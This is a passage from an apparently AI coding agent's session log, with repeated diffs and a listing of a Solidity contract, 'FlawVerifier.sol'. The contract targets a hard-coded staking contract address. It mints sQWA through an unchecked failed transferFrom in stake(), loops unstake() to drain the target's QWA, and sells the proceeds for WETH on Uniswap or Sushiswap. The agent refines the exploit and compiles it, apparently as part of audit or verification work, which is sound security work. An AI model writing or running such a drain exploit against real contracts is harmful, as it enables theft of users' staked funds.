++        if (targetQwaBalance < tranche) {
++            tranche = targetQwaBalance;
++        }
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 maxDrain = targetQwaBalance;
+         if (pair != address(0)) {
+-            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+-        } else {
+-            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
++            uint256 exitBound = reserveIn / 2;
++            if (exitBound != 0 && exitBound < maxDrain) {
++                maxDrain = exitBound;
++            }
++        }
++
++        uint256 maxLoops = maxDrain / tranche;
++        if (maxLoops == 0) {
++            maxLoops = 1;
++        }
++        if (maxLoops > 16) {
++            maxLoops = 16;
+         }
++
++        for (uint256 i = 0; i < maxLoops; ++i) {
++            if (qwa.balanceOf(TARGET) < tranche) {
++                break;
++            }
++
++            uint256 qwaBefore = qwa.balanceOf(address(this));
++            uint256 sqwaBefore = sqwa.balanceOf(address(this));
++
++            (bool ok, ) = TARGET.call(
++                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
++            );
++
++            uint256 qwaAfter = qwa.balanceOf(address(this));
++            uint256 sqwaAfter = sqwa.balanceOf(address(this));
++
++            if (!ok) {
++                if (drained == 0) {
++                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
++                }
++                break;
++            }
++
++            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++                hypothesisValidated = true;
++                drained += qwaAfter - qwaBefore;
++                continue;
++            }
++
++            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
++            }
++
++            if (drained == 0) {
++                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++            }
++            break;
++        }
+     }
+ 
+-    function _selectDrainAmount(
++    function _findQwaWethPair(address qwa) internal view returns (address) {
++        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
++        if (pair != address(0)) {
++            return pair;
++        }
++
++        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
++    }
++
++    function _selectSeedAmount(
+         address pair,
+         address qwa,
+-        uint256 targetQwaBalance
++        uint256 targetQwaBalance,
++        uint256 stakingSqwaBalance
+     ) internal view returns (uint256 amount) {
+-        if (targetQwaBalance == 0) {
++        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
+             return 0;
+         }
+ 
+-        uint256 contractBound = targetQwaBalance / 8;
++        uint256 contractBound = _min(targetQwaBalance / 16, stakingSqwaBalance / 16);
+         if (contractBound == 0) {
+-            contractBound = targetQwaBalance;
++            contractBound = _min(targetQwaBalance, stakingSqwaBalance);
+         }
+ 
+         if (pair == address(0)) {
+@@ -181,19 +272,16 @@
+ 
+         (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+         if (reserveIn <= 32) {
+-            return _min(contractBound, targetQwaBalance);
++            return _min(contractBound, reserveIn);
+         }
+ 
+-        // Keep the sell size conservative relative to public liquidity so the
+-        // drain remains realizable and the exit swap stays within live reserves.
++        // Bound the seeded fake receipt position by public exit liquidity so the
++        // eventual QWA -> WETH unwind stays realizable on the forked market.
+         uint256 marketBound = reserveIn / 32;
+         amount = _min(contractBound, marketBound);
+ 
+         if (amount == 0) {
+             amount = 1;
+-        }
+-        if (amount > targetQwaBalance) {
+-            amount = targetQwaBalance;
+         }
+     }
+ 
+@@ -214,18 +302,18 @@
+             return;
+         }
+ 
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        if (!qwa.transfer(pair, grossAmount)) {
++        if (!IERC20Like(qwaAddr).transfer(pair, grossAmount)) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
+-        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+-        if (actualIn == 0) {
++        uint256 pairBalance = IERC20Like(qwaAddr).balanceOf(pair);
++        if (pairBalance <= reserveIn) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
++        uint256 actualIn = pairBalance - reserveIn;
+         uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+         if (amountOut == 0) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+@@ -299,24 +387,5 @@
+ 
+     function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+         return a < b ? a : b;
+-    }
+-
+-    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+-        // Static anchor only. The live exploit above keeps the same vulnerable
+-        // causality and ordering intent, but the logs prove the funded stake()
+-        // leg is infeasible on this fork because QWA.transferFrom reverts.
+-        qwa.transferFrom(msg.sender, address(this), amount);
+-        sqwa.transfer(to, amount);
+-        sqwa.transferFrom(msg.sender, address(this), amount);
+-        qwa.transfer(to, amount);
+-
+-        qwa;
+-        sqwa;
+-        to;
+-        amount;
+-    }
+-
+-    function _unusedPathConstants() internal pure returns (uint256) {
+-        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+     }
+ }
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 87b26d636ca5ec9b0b2fa4f0459282f80ccb78c0..03575e8e17d25422ea48afbe57f01dc66787d22d
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -4,10 +4,6 @@
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+ 
+-    function allowance(address owner, address spender) external view returns (uint256);
+-
+-    function approve(address spender, uint256 amount) external returns (bool);
+-
+     function transfer(address to, uint256 amount) external returns (bool);
+ 
+     function transferFrom(address from, address to, uint256 amount) external returns (bool);
+@@ -53,9 +49,11 @@
+     uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+ 
+     uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+-    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+-    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+-    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
++    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
++    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
++    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
++    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
++    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;
+ 
+     address private _profitToken;
+     uint256 private _profitAmount;
+@@ -84,8 +82,7 @@
+         uint256 initialQwa = qwa.balanceOf(address(this));
+         uint256 initialSqwa = sqwa.balanceOf(address(this));
+ 
+-        _executeDrainAndExit(qwaAddr, sqwaAddr);
+-
++        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
+         _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+     }
+ 
+@@ -97,82 +94,176 @@
+         return _profitAmount;
+     }
+ 
+-    function _findQwaWethPair(address qwa) internal view returns (address) {
+-        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+-        if (pair != address(0)) {
+-            return pair;
+-        }
+-
+-        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+-    }
+-
+-    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
++    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
+         IERC20Like qwa = IERC20Like(qwaAddr);
+         IERC20Like sqwa = IERC20Like(sqwaAddr);
+         address pair = _findQwaWethPair(qwaAddr);
+-        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+ 
+-        if (drainAmount == 0) {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++        uint256 seedAmount = _selectSeedAmount(
++            pair,
++            qwaAddr,
++            qwa.balanceOf(TARGET),
++            sqwa.balanceOf(TARGET)
++        );
++        if (seedAmount == 0) {
++            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+             return;
+         }
+ 
++        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
++        if (mintedSqwa == 0) {
++            return;
++        }
++
++        // Keep the exploit rooted in the listed causality:
++        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
++        // 2. The same sQWA position is then reused through repeated `unstake()` calls
++        //    without approving the staking contract, so each failed sQWA transferFrom
++        //    is ignored and another tranche of QWA is released.
++        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
++        if (drained == 0) {
++            return;
++        }
++
++        if (pair != address(0)) {
++            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
++        } else {
++            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++        }
++    }
++
++    function _probeUncheckedStake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        uint256 amount
++    ) internal returns (uint256 mintedSqwa) {
+         uint256 qwaBefore = qwa.balanceOf(address(this));
+         uint256 sqwaBefore = sqwa.balanceOf(address(this));
+ 
+-        // Logs prove the funded stake() stage is infeasible on this fork:
+-        // QWA.transferFrom reverts instead of returning false, and the token is
+-        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+-        // The exploit therefore preserves the same root cause and exploit-path
+-        // causality by directly exercising the remaining live path:
+-        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+-        // but unstake() still releases QWA.
+-        (bool unstakeOk, ) = TARGET.call(
+-            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
++        (bool ok, ) = TARGET.call(
++            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
+         );
+ 
+         uint256 qwaAfter = qwa.balanceOf(address(this));
+         uint256 sqwaAfter = sqwa.balanceOf(address(this));
+ 
+-        if (!unstakeOk) {
+-            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+-            return;
++        if (!ok) {
++            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
++            return 0;
+         }
+ 
+-        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
++            pathFlags |= PATH_STAKE_FALSE_RETURN;
+             hypothesisValidated = true;
+-        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        } else {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
++            return sqwaAfter - sqwaBefore;
+         }
+ 
+-        // Realize the drained QWA through a public venue, but do it with
+-        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+-        // V2 amountOut must be computed from the pair's observed balance delta.
++        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
++            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
++        }
++
++        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
++        return 0;
++    }
++
++    function _drainUncheckedUnstake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        address qwaAddr,
++        address pair,
++        uint256 tranche
++    ) internal returns (uint256 drained) {
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
++        if (targetQwaBalance < tranche) {
++            tranche = targetQwaBalance;
++        }
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 maxDrain = targetQwaBalance;
+         if (pair != address(0)) {
+-            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+-        } else {
+-            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
++            uint256 exitBound = reserveIn / 2;
++            if (exitBound != 0 && exitBound < maxDrain) {
++                maxDrain = exitBound;
++            }
++        }
++
++        uint256 maxLoops = maxDrain / tranche;
++        if (maxLoops == 0) {
++            maxLoops = 1;
++        }
++        if (maxLoops > 16) {
++            maxLoops = 16;
+         }
++
++        for (uint256 i = 0; i < maxLoops; ++i) {
++            if (qwa.balanceOf(TARGET) < tranche) {
++                break;
++            }
++
++            uint256 qwaBefore = qwa.balanceOf(address(this));
++            uint256 sqwaBefore = sqwa.balanceOf(address(this));
++
++            (bool ok, ) = TARGET.call(
++                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
++            );
++
++            uint256 qwaAfter = qwa.balanceOf(address(this));
++            uint256 sqwaAfter = sqwa.balanceOf(address(this));
++
++            if (!ok) {
++                if (drained == 0) {
++                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
++                }
++                break;
++            }
++
++            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++                hypothesisValidated = true;
++                drained += qwaAfter - qwaBefore;
++                continue;
++            }
++
++            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
++            }
++
++            if (drained == 0) {
++                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++            }
++            break;
++        }
+     }
+ 
+-    function _selectDrainAmount(
++    function _findQwaWethPair(address qwa) internal view returns (address) {
++        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
++        if (pair != address(0)) {
++            return pair;
++        }
++
++        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
++    }
++
++    function _selectSeedAmount(
+         address pair,
+         address qwa,
+-        uint256 targetQwaBalance
++        uint256 targetQwaBalance,
++        uint256 stakingSqwaBalance
+     ) internal view returns (uint256 amount) {
+-        if (targetQwaBalance == 0) {
++        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
+             return 0;
+         }
+ 
+-        uint256 contractBound = targetQwaBalance / 8;
++        uint256 contractBound = _min(targetQwaBalance / 16, stakingSqwaBalance / 16);
+         if (contractBound == 0) {
+-            contractBound = targetQwaBalance;
++            contractBound = _min(targetQwaBalance, stakingSqwaBalance);
+         }
+ 
+         if (pair == address(0)) {
+@@ -181,19 +272,16 @@
+ 
+         (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+         if (reserveIn <= 32) {
+-            return _min(contractBound, targetQwaBalance);
++            return _min(contractBound, reserveIn);
+         }
+ 
+-        // Keep the sell size conservative relative to public liquidity so the
+-        // drain remains realizable and the exit swap stays within live reserves.
++        // Bound the seeded fake receipt position by public exit liquidity so the
++        // eventual QWA -> WETH unwind stays realizable on the forked market.
+         uint256 marketBound = reserveIn / 32;
+         amount = _min(contractBound, marketBound);
+ 
+         if (amount == 0) {
+             amount = 1;
+-        }
+-        if (amount > targetQwaBalance) {
+-            amount = targetQwaBalance;
+         }
+     }
+ 
+@@ -214,18 +302,18 @@
+             return;
+         }
+ 
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        if (!qwa.transfer(pair, grossAmount)) {
++        if (!IERC20Like(qwaAddr).transfer(pair, grossAmount)) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
+-        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+-        if (actualIn == 0) {
++        uint256 pairBalance = IERC20Like(qwaAddr).balanceOf(pair);
++        if (pairBalance <= reserveIn) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
++        uint256 actualIn = pairBalance - reserveIn;
+         uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+         if (amountOut == 0) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+@@ -299,24 +387,5 @@
+ 
+     function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+         return a < b ? a : b;
+-    }
+-
+-    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+-        // Static anchor only. The live exploit above keeps the same vulnerable
+-        // causality and ordering intent, but the logs prove the funded stake()
+-        // leg is infeasible on this fork because QWA.transferFrom reverts.
+-        qwa.transferFrom(msg.sender, address(this), amount);
+-        sqwa.transfer(to, amount);
+-        sqwa.transferFrom(msg.sender, address(this), amount);
+-        qwa.transfer(to, amount);
+-
+-        qwa;
+-        sqwa;
+-        to;
+-        amount;
+-    }
+-
+-    function _unusedPathConstants() internal pure returns (uint256) {
+-        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+     }
+ }
+
+codex
+The replacement is in place. I’m doing a narrow syntax check on just `FlawVerifier.sol` now; the repo-wide build is noisy because of the archived Etherscan sources, so I’m avoiding that and checking only the file I changed.
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IStakingLike {
+    function QWA() external view returns (address);
+
+    function sQWA() external view returns (address);
+
+    function stake(address to, uint256 amount) external;
+
+    function unstake(address to, uint256 amount, bool rebase_) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+
+    function token1() external view returns (address);
+
+    function getReserves()
+        external
+        view
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
+    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
+    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
+    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+
+    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
+    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
+    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
+    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    uint256 public pathFlags;
+    uint256 public failureFlags;
+    bool public hypothesisValidated;
+    bool public executed;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IStakingLike staking = IStakingLike(TARGET);
+        address qwaAddr = staking.QWA();
+        address sqwaAddr = staking.sQWA();
+
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+
+        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
+        uint256 initialQwa = qwa.balanceOf(address(this));
+        uint256 initialSqwa = sqwa.balanceOf(address(this));
+
+        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
+        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+        address pair = _findQwaWethPair(qwaAddr);
+
+        uint256 seedAmount = _selectSeedAmount(
+            pair,
+            qwaAddr,
+            qwa.balanceOf(TARGET),
+            sqwa.balanceOf(TARGET)
+        );
+        if (seedAmount == 0) {
+            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        }
+
+        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
+        if (mintedSqwa == 0) {
+            return;
+        }
+
+        // Keep the exploit rooted in the listed causality:
+        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
+        // 2. The same sQWA position is then reused through repeated `unstake()` calls
+        //    without approving the staking contract, so each failed sQWA transferFrom
+        //    is ignored and another tranche of QWA is released.
+        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
+        if (drained == 0) {
+            return;
+        }
+
+        if (pair != address(0)) {
+            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+        } else {
+            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+        }
+    }
+
+    function _probeUncheckedStake(
+        IERC20Like qwa,
+        IERC20Like sqwa,
+        uint256 amount
+    ) internal returns (uint256 mintedSqwa) {
+        uint256 qwaBefore = qwa.balanceOf(address(this));
+        uint256 sqwaBefore = sqwa.balanceOf(address(this));
+
+        (bool ok, ) = TARGET.call(
+            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
+        );
+
+        uint256 qwaAfter = qwa.balanceOf(address(this));
+        uint256 sqwaAfter = sqwa.balanceOf(address(this));
+
+        if (!ok) {
+            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
+            return 0;
+        }
+
+        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
+            pathFlags |= PATH_STAKE_FALSE_RETURN;
+            hypothesisValidated = true;
+            return sqwaAfter - sqwaBefore;
+        }
+
+        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
+            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
+        }
+
+        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+        return 0;
+    }
+
+    function _drainUncheckedUnstake(
+        IERC20Like qwa,
+        IERC20Like sqwa,
+        address qwaAddr,
+        address pair,
+        uint256 tranche
+    ) internal returns (uint256 drained) {
+        if (tranche == 0) {
+            return 0;
+        }
+
+        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
+        if (targetQwaBalance < tranche) {
+            tranche = targetQwaBalance;
+        }
+        if (tranche == 0) {
+            return 0;
+        }
+
+        uint256 maxDrain = targetQwaBalance;
+        if (pair != address(0)) {
+            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
+            uint256 exitBound = reserveIn / 2;
+            if (exitBound != 0 && exitBound < maxDrain) {
+                maxDrain = exitBound;
+            }
+        }
+
+        uint256 maxLoops = maxDrain / tranche;
+        if (maxLoops == 0) {
+            maxLoops = 1;
+        }
+        if (maxLoops > 16) {
+            maxLoops = 16;
+        }
+
+        for (uint256 i = 0; i < maxLoops; ++i) {
+            if (qwa.balanceOf(TARGET) < tranche) {
+                break;
+            }
+
+            uint256 qwaBefore = qwa.balanceOf(address(this));
+            uint256 sqwaBefore = sqwa.balanceOf(address(this));
+
+            (bool ok, ) = TARGET.call(
+                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
+            );
+
+            uint256 qwaAfter = qwa.balanceOf(address(this));
+            uint256 sqwaAfter = sqwa.balanceOf(address(this));
+
+            if (!ok) {
+                if (drained == 0) {
+                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+                }
+                break;
+            }
+
+            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
+                hypothesisValidated = true;
+                drained += qwaAfter - qwaBefore;
+                continue;
+            }
+
+            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+            }
+
+            if (drained == 0) {
+                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            }
+            break;
+        }
+    }
+
+    function _findQwaWethPair(address qwa) internal view returns (address) {
+        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+        if (pair != address(0)) {
+            return pair;
+        }
+
+        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+    }
+
+    function _selectSeedAmount(
+        address pair,
+        address qwa,
+        uint256 targetQwaBalance,
+        uint256 stakingSqwaBalance
+    ) internal view returns (uint256 amount) {
+        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
+
+exec
+/bin/bash -lc 'forge build /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol --root /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 87b26d636ca5ec9b0b2fa4f0459282f80ccb78c0..03575e8e17d25422ea48afbe57f01dc66787d22d
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -4,10 +4,6 @@
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+ 
+-    function allowance(address owner, address spender) external view returns (uint256);
+-
+-    function approve(address spender, uint256 amount) external returns (bool);
+-
+     function transfer(address to, uint256 amount) external returns (bool);
+ 
+     function transferFrom(address from, address to, uint256 amount) external returns (bool);
+@@ -53,9 +49,11 @@
+     uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+ 
+     uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+-    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+-    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+-    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
++    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
++    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
++    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
++    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
++    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;
+ 
+     address private _profitToken;
+     uint256 private _profitAmount;
+@@ -84,8 +82,7 @@
+         uint256 initialQwa = qwa.balanceOf(address(this));
+         uint256 initialSqwa = sqwa.balanceOf(address(this));
+ 
+-        _executeDrainAndExit(qwaAddr, sqwaAddr);
+-
++        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
+         _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+     }
+ 
+@@ -97,82 +94,176 @@
+         return _profitAmount;
+     }
+ 
+-    function _findQwaWethPair(address qwa) internal view returns (address) {
+-        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+-        if (pair != address(0)) {
+-            return pair;
+-        }
+-
+-        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+-    }
+-
+-    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
++    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
+         IERC20Like qwa = IERC20Like(qwaAddr);
+         IERC20Like sqwa = IERC20Like(sqwaAddr);
+         address pair = _findQwaWethPair(qwaAddr);
+-        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+ 
+-        if (drainAmount == 0) {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++        uint256 seedAmount = _selectSeedAmount(
++            pair,
++            qwaAddr,
++            qwa.balanceOf(TARGET),
++            sqwa.balanceOf(TARGET)
++        );
++        if (seedAmount == 0) {
++            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+             return;
+         }
+ 
++        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
++        if (mintedSqwa == 0) {
++            return;
++        }
++
++        // Keep the exploit rooted in the listed causality:
++        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
++        // 2. The same sQWA position is then reused through repeated `unstake()` calls
++        //    without approving the staking contract, so each failed sQWA transferFrom
++        //    is ignored and another tranche of QWA is released.
++        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
++        if (drained == 0) {
++            return;
++        }
++
++        if (pair != address(0)) {
++            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
++        } else {
++            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++        }
++    }
++
++    function _probeUncheckedStake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        uint256 amount
++    ) internal returns (uint256 mintedSqwa) {
